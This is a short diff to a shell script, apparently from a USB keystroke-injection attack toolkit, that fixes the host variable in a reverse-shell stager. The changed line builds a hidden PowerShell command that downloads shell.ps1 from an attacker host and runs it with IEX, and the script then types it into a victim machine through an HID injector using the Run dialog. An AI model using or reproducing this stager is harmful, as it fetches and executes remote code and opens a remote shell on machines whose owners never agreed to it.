@@ -9,7 +9,8 @@ CONFIG="/opt/p4wnp1-o2/config/reverse_shell.conf"
 HOST="${RS_HOST}"
 SCRIPT="shell.ps1"
 
-CMD="powershell -WindowStyle hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/$SCRIPT')"
+# Use the resolved HOST variable for the download URL
+CMD="powershell -WindowStyle hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://$HOST/$SCRIPT')"
 ESCAPED=$(echo "$CMD" | sed 's/"/\\"/g')
 
 /opt/p4wnp1/tools/hid_injector inject "GUI r"
